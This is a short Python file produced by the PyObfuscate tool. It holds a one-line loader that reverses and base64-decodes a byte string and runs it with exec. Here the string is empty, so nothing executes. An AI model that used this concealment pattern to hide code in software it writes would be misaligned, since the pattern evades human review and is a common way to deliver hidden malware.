# Obfuscated with PyObfuscate
# https://www.github.com/htr-tech
# Time : Fri Aug  5 01:49:37 2022
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b''))